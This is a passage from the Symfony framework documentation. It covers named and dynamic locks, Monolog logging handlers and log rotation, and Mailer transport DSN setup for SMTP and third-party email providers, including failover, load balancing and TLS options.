heavy computation\n            $myPdf = $pdf->getOrCreatePdf();\n\n            $lock->release();\n\n            // ...\n        }\n    }\n\n.. warning::\n\n    The same instance of ``LockInterface`` won't block when calling ``acquire``\n    multiple times inside the same process. When several services use the\n    same lock, inject the ``LockFactory`` instead to create a separate lock\n    instance for each service.\n\nLocking a Dynamic Resource\n--------------------------\n\nSometimes the application is able to cut the resource into small pieces in order\nto lock a small subset of processes and let others through. The previous example\nshowed how to lock the ``$pdf->getOrCreatePdf()`` call for everybody,\nnow let's see how to lock a ``$pdf->getOrCreatePdf($version)`` call only for\nprocesses asking for the same ``$version``::\n\n    // src/Controller/PdfController.php\n    namespace App\\Controller;\n\n    use Symfony\\Bundle\\FrameworkBundle\\Controller\\AbstractController;\n    use Symfony\\Component\\HttpFoundation\\Response;\n    use Symfony\\Component\\Lock\\LockFactory;\n\n    class PdfController extends AbstractController\n    {\n        #[Route('/download/{version}/terms-of-use.pdf')]\n        public function downloadPdf($version, LockFactory $lockFactory, MyPdfGeneratorService $pdf): Response\n        {\n            $lock = $lockFactory->createLock('pdf-creation-'.$version);\n            $lock->acquire(true);\n\n            // heavy computation\n            $myPdf = $pdf->getOrCreatePdf($version);\n\n            $lock->release();\n\n            // ...\n        }\n    }\n\n.. _lock-named-locks:\n\nNaming Locks\n------------\n\nIf the application needs different kind of Stores alongside each other, Symfony\nprovides :ref:`named lock <reference-lock-resources-name>`:\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/packages/lock.yaml\n        framework:\n            lock:\n                invoice: ['semaphore', 'redis://r2.docker']\n                report: 'semaphore'\n\n    .. code-block:: xml\n\n        <!-- config/packages/lock.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xmlns:framework=\"http://symfony.com/schema/dic/symfony\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\n                http://symfony.com/schema/dic/symfony https://symfony.com/schema/dic/symfony/symfony-1.0.xsd\">\n\n            <framework:config>\n                <framework:lock>\n                    <framework:resource name=\"invoice\">semaphore</framework:resource>\n                    <framework:resource name=\"invoice\">redis://r2.docker</framework:resource>\n                    <framework:resource name=\"report\">semaphore</framework:resource>\n                </framework:lock>\n            </framework:config>\n        </container>\n\n    .. code-block:: php\n\n        // config/packages/lock.php\n        use Symfony\\Config\\FrameworkConfig;\n\n        return static function (FrameworkConfig $framework): void {\n            $framework->lock()\n                ->resource('invoice', ['semaphore', 'redis://r2.docker'])\n                ->resource('report', ['semaphore']);\n            ;\n        };\n\nAn autowiring alias is created for each named lock with a name using the camel\ncase version of its name suffixed by ``LockFactory``.\n\nFor instance, the ``invoice`` lock can be injected by naming the argument\n``$invoiceLockFactory`` and type-hinting it with\n:class:`Symfony\\\\Component\\\\Lock\\\\LockFactory`::\n\n    // src/Controller/PdfController.php\n    namespace App\\Controller;\n\n    use Symfony\\Bundle\\FrameworkBundle\\Controller\\AbstractController;\n    use Symfony\\Component\\HttpFoundation\\Response;\n    use Symfony\\Component\\Lock\\LockFactory;\n\n    class PdfController extends AbstractController\n    {\n        #[Route('/download/terms-of-use.pdf')]\n        public function downloadPdf(LockFactory $invoiceLockFactory, MyPdfGeneratorService $pdf): Response\n        {\n            // ...\n        }\n    }\n"
        },
        {
          "name": "logging.rst",
          "type": "blob",
          "size": 15.87890625,
          "content": "Logging\n=======\n\nSymfony comes with a minimalist `PSR-3`_ logger: :class:`Symfony\\\\Component\\\\HttpKernel\\\\Log\\\\Logger`.\nIn conformance with `the twelve-factor app methodology`_, it sends messages starting from the\n``WARNING`` level to `stderr`_.\n\nThe minimal log level can be changed by setting the ``SHELL_VERBOSITY`` environment variable:\n\n=========================  =================\n``SHELL_VERBOSITY`` value  Minimum log level\n=========================  =================\n``-1``                     ``ERROR``\n``1``                      ``NOTICE``\n``2``                      ``INFO``\n``3``                      ``DEBUG``\n=========================  =================\n\nThe minimum log level, the default output and the log format can also be changed by\npassing the appropriate arguments to the constructor of :class:`Symfony\\\\Component\\\\HttpKernel\\\\Log\\\\Logger`.\nTo do so, :ref:`override the \"logger\" service definition <service-psr4-loader>`.\n\nLogging a Message\n-----------------\n\nTo log a message, inject the default logger in your controller or service::\n\n    use Psr\\Log\\LoggerInterface;\n    // ...\n\n    public function index(LoggerInterface $logger): Response\n    {\n        $logger->info('I just got the logger');\n        $logger->error('An error occurred');\n\n        // log messages can also contain placeholders, which are variable names\n        // wrapped in braces whose values are passed as the second argument\n        $logger->debug('User {userId} has logged in', [\n            'userId' => $this->getUserId(),\n        ]);\n\n        $logger->critical('I left the oven on!', [\n            // include extra \"context\" info in your logs\n            'cause' => 'in_hurry',\n        ]);\n\n        // ...\n    }\n\nAdding placeholders to log messages is recommended because:\n\n* It's easier to check log messages because many logging tools group log messages\n  that are the same except for some variable values inside them;\n* It's much easier to translate those log messages;\n* It's better for security, because escaping can then be done by the\n  implementation in a context-aware fashion.\n\nThe ``logger`` service has different methods for different logging levels/priorities.\nSee `LoggerInterface`_ for a list of all of the methods on the logger.\n\nMonolog\n-------\n\nSymfony integrates seamlessly with `Monolog`_, the most popular PHP logging\nlibrary, to create and store log messages in a variety of different places\nand trigger various actions.\n\nFor instance, using Monolog you can configure the logger to do different things based on the\n*level* of a message (e.g. :doc:`send an email when an error occurs </logging/monolog_email>`).\n\nRun this command to install the Monolog based logger before using it:\n\n.. code-block:: terminal\n\n    $ composer require symfony/monolog-bundle\n\nThe following sections assume that Monolog is installed.\n\nWhere Logs are Stored\n---------------------\n\nBy default, log entries are written to the ``var/log/dev.log`` file when you're\nin the ``dev`` environment.\n\nIn the ``prod`` environment, logs are written to `STDERR PHP stream`_, which\nworks best in modern containerized applications deployed to servers without\ndisk write permissions.\n\nIf you prefer to store production logs in a file, set the ``path`` of your\nlog handler(s) to the path of the file to use (e.g. ``var/log/prod.log``).\n\nHandlers: Writing Logs to different Locations\n---------------------------------------------\n\nThe logger has a stack of *handlers*, and each can be used to write the log entries\nto different locations (e.g. files, database, Slack, etc).\n\n.. tip::\n\n    You can *also* configure logging \"channels\", which are like categories. Each\n    channel can have its *own* handlers, which means you can store different log\n    messages in different places. See :doc:`/logging/channels_handlers`.\n\nSymfony pre-configures some basic handlers in the default ``monolog.yaml``\nconfig files. Check these out for some real-world examples.\n\nThis example uses *two* handlers: ``stream`` (to write to a file) and ``syslog``\nto write logs using the :phpfunction:`syslog` function:\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/packages/prod/monolog.yaml\n        monolog:\n            handlers:\n                # this \"file_log\" key could be anything\n                file_log:\n                    type: stream\n                    # log to var/log/(environment).log\n                    path: \"%kernel.logs_dir%/%kernel.environment%.log\"\n                    # log *all* messages (debug is lowest level)\n                    level: debug\n\n                syslog_handler:\n                    type: syslog\n                    # log error-level messages and higher\n                    level: error\n\n    .. code-block:: xml\n\n        <!-- config/packages/prod/monolog.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xmlns:monolog=\"http://symfony.com/schema/dic/monolog\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\n                http://symfony.com/schema/dic/monolog\n                https://symfony.com/schema/dic/monolog/monolog-1.0.xsd\">\n\n            <monolog:config>\n                <!-- this \"file_log\" key could be anything -->\n                <monolog:handler name=\"file_log\"\n                    type=\"stream\"\n                    path=\"%kernel.logs_dir%/%kernel.environment%.log\"\n                    level=\"debug\"/><!-- log *all* messages (debug is lowest level) -->\n\n                <monolog:handler name=\"syslog_handler\"\n                    type=\"syslog\"\n                    level=\"error\"/><!-- log error-level messages and higher -->\n            </monolog:config>\n        </container>\n\n    .. code-block:: php\n\n        // config/packages/prod/monolog.php\n        use Psr\\Log\\LogLevel;\n        use Symfony\\Config\\MonologConfig;\n\n        return static function (MonologConfig $monolog): void {\n            // this \"file_log\" key could be anything\n            $monolog->handler('file_log')\n                ->type('stream')\n                // log to var/logs/(environment).log\n                ->path('%kernel.logs_dir%/%kernel.environment%.log')\n                // log *all* messages (LogLevel::DEBUG is lowest level)\n                ->level(LogLevel::DEBUG);\n\n            $monolog->handler('syslog_handler')\n                ->type('syslog')\n                // log error-level messages and higher\n                ->level(LogLevel::ERROR);\n        };\n\nThis defines a *stack* of handlers and each handler is called in the order that it's\ndefined.\n\n.. note::\n\n    If you want to override the ``monolog`` configuration via another config\n    file, you will need to redefine the entire ``handlers`` stack. The configuration\n    from the two files cannot be merged because the order matters and a merge does\n    not allow you to control the order.\n\n.. _logging-handler-fingers_crossed:\n\nHandlers that Modify Log Entries\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nInstead of writing log files somewhere, *some* handlers are used to filter or modify\nlog entries before sending them to *other* handlers. One powerful, built-in handler\ncalled ``fingers_crossed`` is used in the ``prod`` environment by default. It stores\n*all* log messages during a request but *only* passes them to a second handler if\none of the messages reaches an ``action_level``. Take this example:\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/packages/prod/monolog.yaml\n        monolog:\n            handlers:\n                filter_for_errors:\n                    type: fingers_crossed\n                    # if *one* log is error or higher, pass *all* to file_log\n                    action_level: error\n                    handler: file_log\n\n                # now passed *all* logs, but only if one log is error or higher\n                file_log:\n                    type: stream\n                    path: \"%kernel.logs_dir%/%kernel.environment%.log\"\n\n                # still passed *all* logs, and still only logs error or higher\n                syslog_handler:\n                    type: syslog\n                    level: error\n\n    .. code-block:: xml\n\n        <!-- config/packages/prod/monolog.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xmlns:monolog=\"http://symfony.com/schema/dic/monolog\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\n                http://symfony.com/schema/dic/monolog\n                https://symfony.com/schema/dic/monolog/monolog-1.0.xsd\">\n\n            <monolog:config>\n                <!-- if *one* log is error or higher, pass *all* to file_log -->\n                <monolog:handler name=\"filter_for_errors\"\n                    type=\"fingers_crossed\"\n                    action-level=\"error\"\n                    handler=\"file_log\"\n                />\n\n                <!-- now passed *all* logs, but only if one log is error or higher -->\n                <monolog:handler name=\"file_log\"\n                    type=\"stream\"\n                    path=\"%kernel.logs_dir%/%kernel.environment%.log\"\n                    level=\"debug\"\n                />\n\n                <!-- still passed *all* logs, and still only logs error or higher -->\n                <monolog:handler name=\"syslog_handler\"\n                    type=\"syslog\"\n                    level=\"error\"\n                />\n            </monolog:config>\n        </container>\n\n    .. code-block:: php\n\n        // config/packages/prod/monolog.php\n        use Psr\\Log\\LogLevel;\n        use Symfony\\Config\\MonologConfig;\n\n        return static function (MonologConfig $monolog): void {\n            $monolog->handler('filter_for_errors')\n                ->type('fingers_crossed')\n                // if *one* log is error or higher, pass *all* to file_log\n                ->actionLevel(LogLevel::ERROR)\n                ->handler('file_log')\n            ;\n\n            // now passed *all* logs, but only if one log is error or higher\n            $monolog->handler('file_log')\n                ->type('stream')\n                ->path('%kernel.logs_dir%/%kernel.environment%.log')\n                ->level(LogLevel::DEBUG)\n            ;\n\n            // still passed *all* logs, and still only logs error or higher\n            $monolog->handler('syslog_handler')\n                ->type('syslog')\n                ->level(LogLevel::ERROR)\n            ;\n        };\n\nNow, if even one log entry has an ``LogLevel::ERROR`` level or higher, then *all* log entries\nfor that request are saved to a file via the ``file_log`` handler. That means that\nyour log file will contain *all* the details about the problematic request - making\ndebugging much easier!\n\n.. tip::\n\n    The handler named \"file_log\" will not be included in the stack itself as\n    it is used as a nested handler of the ``fingers_crossed`` handler.\n\nAll Built-in Handlers\n---------------------\n\nMonolog comes with *many* built-in handlers for emailing logs, sending them to Loggly,\nor notifying you in Slack. These are documented inside of MonologBundle itself. For\na full list, see `Monolog Configuration`_.\n\nHow to Rotate your Log Files\n----------------------------\n\nOver time, log files can grow to be *huge*, both while developing and on\nproduction. One best-practice solution is to use a tool like the `logrotate`_\nLinux command to rotate log files before they become too large.\n\nAnother option is to have Monolog rotate the files for you by using the\n``rotating_file`` handler. This handler creates a new log file every day\nand can also remove old files automatically. To use it, set the ``type``\noption of your handler to ``rotating_file``:\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/packages/prod/monolog.yaml\n        monolog:\n            handlers:\n                main:\n                    type:  rotating_file\n                    path:  '%kernel.logs_dir%/%kernel.environment%.log'\n                    level: debug\n                    # max number of log files to keep\n                    # defaults to zero, which means infinite files\n                    max_files: 10\n\n    .. code-block:: xml\n\n        <!-- config/packages/prod/monolog.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xmlns:monolog=\"http://symfony.com/schema/dic/monolog\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\n                http://symfony.com/schema/dic/monolog\n                https://symfony.com/schema/dic/monolog/monolog-1.0.xsd\">\n\n            <monolog:config>\n                <!-- \"max-files\": max number of log files to keep\n                     defaults to zero, which means infinite files -->\n                <monolog:handler name=\"main\"\n                    type=\"rotating_file\"\n                    path=\"%kernel.logs_dir%/%kernel.environment%.log\"\n                    level=\"debug\"\n                    max-files=\"10\"\n                />\n            </monolog:config>\n        </container>\n\n    .. code-block:: php\n\n        // config/packages/prod/monolog.php\n        use Psr\\Log\\LogLevel;\n        use Symfony\\Config\\MonologConfig;\n\n        return static function (MonologConfig $monolog): void {\n            $monolog->handler('main')\n                ->type('rotating_file')\n                ->path('%kernel.logs_dir%/%kernel.environment%.log')\n                ->level(LogLevel::DEBUG)\n                // max number of log files to keep\n                // defaults to zero, which means infinite files\n                ->maxFiles(10);\n        };\n\nUsing a Logger inside a Service\n-------------------------------\n\nIf your application uses :ref:`service autoconfiguration <services-autoconfigure>`,\nany service whose class implements ``Psr\\Log\\LoggerAwareInterface`` will\nreceive a call to its method ``setLogger()`` with the default logger service\npassed as a service.\n\nIf you want to use in your own services a pre-configured logger which uses a\nspecific channel (``app`` by default), you can either :ref:`autowire monolog channels <monolog-autowire-channels>`\nor use the ``monolog.logger`` tag  with the ``channel`` property as explained in the\n:ref:`Dependency Injection reference <dic_tags-monolog>`.\n\nAdding extra Data to each Log (e.g. a unique request token)\n-----------------------------------------------------------\n\nMonolog also supports *processors*: functions that can dynamically add extra\ninformation to your log entries.\n\nSee :doc:`/logging/processors` for details.\n\nHandling Logs in Long Running Processes\n---------------------------------------\n\nDuring long running processes, logs can be accumulated into Monolog and cause some\nbuffer overflow, memory increase or even non logical logs. Monolog in-memory data\ncan be cleared using the ``reset()`` method on a ``Monolog\\Logger`` instance.\nThis should typically be called between every job or task that a long running process\nis working through.\n\nLearn more\n----------\n\n.. toctree::\n    :maxdepth: 1\n\n    logging/monolog_email\n    logging/channels_handlers\n    logging/formatter\n    logging/processors\n    logging/handlers\n    logging/monolog_exclude_http_codes\n    logging/monolog_console\n\n.. _`the twelve-factor app methodology`: https://12factor.net/logs\n.. _`PSR-3`: https://www.php-fig.org/psr/psr-3/\n.. _`stderr`: https://en.wikipedia.org/wiki/Standard_streams#Standard_error_(stderr)\n.. _`Monolog`: https://github.com/Seldaek/monolog\n.. _`LoggerInterface`: https://github.com/php-fig/log/blob/master/src/LoggerInterface.php\n.. _`logrotate`: https://github.com/logrotate/logrotate\n.. _`Monolog Configuration`: https://github.com/symfony/monolog-bundle/blob/master/DependencyInjection/Configuration.php#L25\n.. _`STDERR PHP stream`: https://www.php.net/manual/en/features.commandline.io-streams.php\n"
        },
        {
          "name": "logging",
          "type": "tree",
          "content": null
        },
        {
          "name": "mailer.rst",
          "type": "blob",
          "size": 74.9951171875,
          "content": "Sending Emails with Mailer\n==========================\n\nInstallation\n------------\n\nSymfony's Mailer & :doc:`Mime </components/mime>` components form a *powerful* system\nfor creating and sending emails - complete with support for multipart messages, Twig\nintegration, CSS inlining, file attachments and a lot more. Get them installed with:\n\n.. code-block:: terminal\n\n    $ composer require symfony/mailer\n\n.. _mailer-transport-setup:\n\nTransport Setup\n---------------\n\nEmails are delivered via a \"transport\". Out of the box, you can deliver emails\nover SMTP by configuring the DSN in your ``.env`` file (the ``user``,\n``pass`` and ``port`` parameters are optional):\n\n.. code-block:: env\n\n    # .env\n    MAILER_DSN=smtp://user:pass@smtp.example.com:port\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/packages/mailer.yaml\n        framework:\n            mailer:\n                dsn: '%env(MAILER_DSN)%'\n\n    .. code-block:: xml\n\n        <!-- config/packages/mailer.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xmlns:framework=\"http://symfony.com/schema/dic/symfony\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\n                http://symfony.com/schema/dic/symfony https://symfony.com/schema/dic/symfony/symfony-1.0.xsd\">\n\n            <framework:config>\n                <framework:mailer dsn=\"%env(MAILER_DSN)%\"/>\n            </framework:config>\n        </container>\n\n    .. code-block:: php\n\n        // config/packages/mailer.php\n        use function Symfony\\Component\\DependencyInjection\\Loader\\Configurator\\env;\n        use Symfony\\Config\\FrameworkConfig;\n\n        return static function (FrameworkConfig $framework): void {\n            $framework->mailer()->dsn(env('MAILER_DSN'));\n        };\n\n.. warning::\n\n    If the username, password or host contain any character considered special in a\n    URI (such as ``: / ? # [ ] @ ! $ & ' ( ) * + , ; =``), you must\n    encode them. See `RFC 3986`_ for the full list of reserved characters or use the\n    :phpfunction:`urlencode` function to encode them.\n\nUsing Built-in Transports\n~~~~~~~~~~~~~~~~~~~~~~~~~\n\n============  ========================================  ==============================================================\nDSN protocol  Example                                   Description\n============  ========================================  ==============================================================\nsmtp          ``smtp://user:pass@smtp.example.com:25``  Mailer uses an SMTP server to send emails\nsendmail      ``sendmail://default``                    Mailer uses the local sendmail binary to send emails\nnative        ``native://default``                      Mailer uses the sendmail binary and options configured\n                                                        in the ``sendmail_path`` setting of ``php.ini``. On Windows\n                                                        hosts, Mailer fallbacks to ``smtp`` and ``smtp_port``\n                                                        ``php.ini`` settings when ``sendmail_path`` is not configured.\n============  ========================================  ==============================================================\n\n.. warning::\n\n    When using ``native://default``, if ``php.ini`` uses the ``sendmail -t``\n    command, you won't have error reporting and ``Bcc`` headers won't be removed.\n    It's highly recommended to NOT use ``native://default`` as you cannot control\n    how sendmail is configured (prefer using ``sendmail://default`` if possible).\n\n.. _mailer_3rd_party_transport:\n\nUsing a 3rd Party Transport\n~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nInstead of using your own SMTP server or sendmail binary, you can send emails\nvia a third-party provider:\n\n===================== =============================================== ===============\nService               Install with                                    Webhook support\n===================== =============================================== ===============\n`Amazon SES`_         ``composer require symfony/amazon-mailer``\n`Azure`_              ``composer require symfony/azure-mailer``\n`Brevo`_              ``composer require symfony/brevo-mailer``       yes\n`Infobip`_            ``composer require symfony/infobip-mailer``\n`Mailgun`_            ``composer require symfony/mailgun-mailer``     yes\n`Mailjet`_            ``composer require symfony/mailjet-mailer``     yes\n`MailPace`_           ``composer require symfony/mail-pace-mailer``\n`MailerSend`_         ``composer require symfony/mailer-send-mailer`` yes\n`Mandrill`_           ``composer require symfony/mailchimp-mailer``\n`Postmark`_           ``composer require symfony/postmark-mailer``    yes\n`Resend`_             ``composer require symfony/resend-mailer``      yes\n`Scaleway`_           ``composer require symfony/scaleway-mailer``\n`SendGrid`_           ``composer require symfony/sendgrid-mailer``    yes\n===================== =============================================== ===============\n\n.. versionadded:: 7.1\n\n    The Azure and Resend integrations were introduced in Symfony 7.1.\n\n.. note::\n\n    As a convenience, Symfony also provides support for Gmail (``composer\n    require symfony/google-mailer``), but this should not be used in\n    production. In development, you should probably use an :ref:`email catcher\n    <mail-catcher>` instead. Note that most supported providers also offer a\n    free tier.\n\nEach library includes a :ref:`Symfony Flex recipe <symfony-flex>` that will add\na configuration example to your ``.env`` file. For example, suppose you want to\nuse SendGrid. First, install it:\n\n.. code-block:: terminal\n\n    $ composer require symfony/sendgrid-mailer\n\nYou'll now have a new line in your ``.env`` file that you can uncomment:\n\n.. code-block:: env\n\n    # .env\n    MAILER_DSN=sendgrid://KEY@default\n\nThe ``MAILER_DSN`` isn't a *real* address: it's a convenient format that\noffloads most of the configuration work to mailer. The ``sendgrid`` scheme\nactivates the SendGrid provider that you just installed, which knows all about\nhow to deliver messages via SendGrid. The *only* part you need to change is the\n``KEY`` placeholder.\n\nEach provider has different environment variables that the Mailer uses to\nconfigure the *actual* protocol, address and authentication for delivery. Some\nalso have options that can be configured with query parameters at the end of the\n``MAILER_DSN`` - like ``?region=`` for Amazon SES, Mailgun or Scaleway. Some providers support\nsending via ``http``, ``api`` or ``smtp``. Symfony chooses the best available\ntransport, but you can force to use one:\n\n.. code-block:: env\n\n    # .env\n    # force to use SMTP instead of HTTP (which is the default)\n    MAILER_DSN=sendgrid+smtp://$SENDGRID_KEY@default\n\nThis table shows the full list of available DSN formats for each third\nparty provider:\n\n+------------------------+---------------------------------------------------------+\n| Provider               | Formats                                                 |\n+========================+=========================================================+\n| `Amazon SES`_          | - SMTP ``ses+smtp://USERNAME:PASSWORD@default``         |\n|                        | - HTTP ``ses+https://ACCESS_KEY:SECRET_KEY@default``    |\n|                        | - API ``ses+api://ACCESS_KEY:SECRET_KEY@default``       |\n+------------------------+---------------------------------------------------------+\n| `Azure`_               | - API ``azure+api://ACS_RESOURCE_NAME:KEY@default``     |\n+------------------------+---------------------------------------------------------+\n| `Brevo`_               | - SMTP ``brevo+smtp://USERNAME:PASSWORD@default``       |\n|                        | - HTTP n/a                                              |\n|                        | - API ``brevo+api://KEY@default``                       |\n+------------------------+---------------------------------------------------------+\n| `Google Gmail`_        | - SMTP ``gmail+smtp://USERNAME:APP-PASSWORD@default``   |\n|                        | - HTTP n/a                                              |\n|                        | - API n/a                                               |\n+------------------------+---------------------------------------------------------+\n| `Infobip`_             | - SMTP ``infobip+smtp://KEY@default``                   |\n|                        | - HTTP n/a                                              |\n|                        | - API ``infobip+api://KEY@BASE_URL``                    |\n+------------------------+---------------------------------------------------------+\n| `Mandrill`_            | - SMTP ``mandrill+smtp://USERNAME:PASSWORD@default``    |\n|                        | - HTTP ``mandrill+https://KEY@default``                 |\n|                        | - API ``mandrill+api://KEY@default``                    |\n+------------------------+---------------------------------------------------------+\n| `MailerSend`_          | - SMTP ``mailersend+smtp://KEY@default``                |\n|                        | - HTTP n/a                                              |\n|                        | - API ``mailersend+api://KEY@BASE_URL``                 |\n+------------------------+---------------------------------------------------------+\n| `Mailgun`_             | - SMTP ``mailgun+smtp://USERNAME:PASSWORD@default``     |\n|                        | - HTTP ``mailgun+https://KEY:DOMAIN@default``           |\n|                        | - API ``mailgun+api://KEY:DOMAIN@default``              |\n+------------------------+---------------------------------------------------------+\n| `Mailjet`_             | - SMTP ``mailjet+smtp://ACCESS_KEY:SECRET_KEY@default`` |\n|                        | - HTTP n/a                                              |\n|                        | - API ``mailjet+api://ACCESS_KEY:SECRET_KEY@default``   |\n+------------------------+---------------------------------------------------------+\n| `MailPace`_            | - SMTP ``mailpace+api://API_TOKEN@default``             |\n|                        | - HTTP n/a                                              |\n|                        | - API ``mailpace+api://API_TOKEN@default``              |\n+------------------------+---------------------------------------------------------+\n| `Postmark`_            | - SMTP ``postmark+smtp://ID@default``                   |\n|                        | - HTTP n/a                                              |\n|                        | - API ``postmark+api://KEY@default``                    |\n+------------------------+---------------------------------------------------------+\n| `Resend`_              | - SMTP ``resend+smtp://resend:API_KEY@default``         |\n|                        | - HTTP n/a                                              |\n|                        | - API ``resend+api://API_KEY@default``                  |\n+------------------------+---------------------------------------------------------+\n| `Scaleway`_            | - SMTP ``scaleway+smtp://PROJECT_ID:API_KEY@default``   |\n|                        | - HTTP n/a                                              |\n|                        | - API ``scaleway+api://PROJECT_ID:API_KEY@default``     |\n+------------------------+---------------------------------------------------------+\n| `Sendgrid`_            | - SMTP ``sendgrid+smtp://KEY@default``                  |\n|                        | - HTTP n/a                                              |\n|                        | - API ``sendgrid+api://KEY@default``                    |\n+------------------------+---------------------------------------------------------+\n\n.. warning::\n\n    If your credentials contain special characters, you must URL-encode them.\n    For example, the DSN ``ses+smtp://ABC1234:abc+12/345@default`` should be\n    configured as ``ses+smtp://ABC1234:abc%2B12%2F345@default``\n\n.. warning::\n\n    If you want to use the ``ses+smtp`` transport together with :doc:`Messenger </messenger>`\n    to :ref:`send messages in background <mailer-sending-messages-async>`,\n    you need to add the ``ping_threshold`` parameter to your ``MAILER_DSN`` with\n    a value lower than ``10``: ``ses+smtp://USERNAME:PASSWORD@default?ping_threshold=9``\n\n.. warning::\n\n    If you send custom headers when using the `Amazon SES`_ transport (to receive\n    them later via a webhook), make sure to use the ``ses+https`` provider because\n    it's the only one that supports them.\n\n.. note::\n\n    When using SMTP, the default timeout for sending a message before throwing an\n    exception is the value defined in the `default_socket_timeout`_ PHP.ini option.\n\n.. note::\n\n    Besides SMTP, many 3rd party transports offer a web API to send emails.\n    To do so, you have to install (additionally to the bridge)\n    the HttpClient component via ``composer require symfony/http-client``.\n\n.. note::\n\n    To use Google Gmail, you must have a Google Account with 2-Step-Verification (2FA)\n    enabled and you must use `App Password`_ to authenticate. Also note that Google\n    revokes your App Passwords when you change your Google Account password and then\n    you need to generate a new one.\n    Using other methods (like ``XOAUTH2`` or the ``Gmail API``) are not supported currently.\n    You should use Gmail for testing purposes only and use a real provider in production.\n\n.. tip::\n\n    If you want to override the default host for a provider (to debug an issue using\n    a service like ``requestbin.com``), change ``default`` by your host:\n\n    .. code-block:: env\n\n        # .env\n        MAILER_DSN=mailgun+https://KEY:DOMAIN@requestbin.com\n\n    Note that the protocol is *always* HTTPs and cannot be changed.\n\n.. note::\n\n    The specific transports, e.g. ``mailgun+smtp`` are designed to work without any manual configuration.\n    Changing the port by appending it to your DSN is not supported for any of these ``<provider>+smtp`` transports.\n    If you need to change the port, use the ``smtp`` transport instead, like so:\n\n    .. code-block:: env\n\n        # .env\n        MAILER_DSN=smtp://KEY:DOMAIN@smtp.eu.mailgun.org.com:25\n\n.. tip::\n\n    Some third party mailers, when using the API, support status callbacks\n    via webhooks. See the :doc:`Webhook documentation </webhook>` for more\n    details.\n\nHigh Availability\n~~~~~~~~~~~~~~~~~\n\nSymfony's mailer supports `high availability`_ via a technique called \"failover\"\nto ensure that emails are sent even if one mailer server fails.\n\nA failover transport is configured with two or more transports and the\n``failover`` keyword:\n\n.. code-block:: env\n\n    MAILER_DSN=\"failover(postmark+api://ID@default sendgrid+smtp://KEY@default)\"\n\nThe failover-transport starts using the first transport and if it fails, it\nwill retry the same delivery with the next transports until one of them succeeds\n(or until all of them fail).\n\nLoad Balancing\n~~~~~~~~~~~~~~\n\nSymfony's mailer supports `load balancing`_ via a technique called \"round-robin\"\nto distribute the mailing workload across multiple transports.\n\nA round-robin transport is configured with two or more transports and the\n``roundrobin`` keyword:\n\n.. code-block:: env\n\n    MAILER_DSN=\"roundrobin(postmark+api://ID@default sendgrid+smtp://KEY@default)\"\n\nThe round-robin transport starts with a *randomly* selected transport and\nthen switches to the next available transport for each subsequent email.\n\nAs with the failover transport, round-robin retries deliveries until\na transport succeeds (or all fail). In contrast to the failover transport,\nit *spreads* the load across all its transports.\n\nTLS Peer Verification\n~~~~~~~~~~~~~~~~~~~~~\n\nBy default, SMTP transports perform TLS peer verification. This behavior is\nconfigurable with the ``verify_peer`` option. Although it's not recommended to\ndisable this verification for security reasons, it can be useful while developing\nthe application or when using a self-signed certificate::\n\n    $dsn = 'smtp://user:pass@smtp.example.com?verify_peer=0';\n\nTLS Peer Fingerprint Verification\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nAdditional fingerprint verification can be enforced with the ``peer_fingerprint``\noption. This is especially useful when a self-signed certificate is used and\ndisabling ``verify_peer`` is needed, but security is still desired. Fingerprint\nmay be specified as SHA1 or MD5 hash::\n\n    $dsn = 'smtp://user:pass@smtp.example.com?peer_fingerprint=6A1CF3B08D175A284C30BC10DE19162307C7286E';\n\nDisabling Automatic TLS\n~~~~~~~~~~~~~~~~~~~~~~~\n\n.. versionadded:: 7.1\n\n    The option to disable automatic TLS was introduced in Symfony 7.1.\n\nBy default, the Mailer component will use encryption when the OpenSSL extension\nis enabled and the SMTP server supports ``STARTTLS``. This behavior can be turned\noff by calling ``setAutoTls(false)`` on the ``EsmtpTransport`` instance, or by\nsetting the ``auto_tls`` option to ``false`` in the DSN::\n\n    $dsn = 'smtp://user:pass@10.0.0.25?auto_tls=false';\n\n.. warning::\n\n    It's not recommended to disable TLS while connecting to an SMTP server over\n    the Internet, but it can be useful when both the application and the SMTP\n    server are in a secured network, where there is no need for additional encryption.\n\n.. note::\n\n    This setting only works when the ``smtp://`` protocol is used.\n\nOverriding default SMTP authenticators\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nBy default, SMTP transports will try to login using all authentication methods\navailable on the SMTP server, one after the other. In some cases, it may be\nuseful to redefine the supported authentication methods to ensure that the\npreferred method will be used first.\n\nThis can be done from ``EsmtpTransport`` constructor 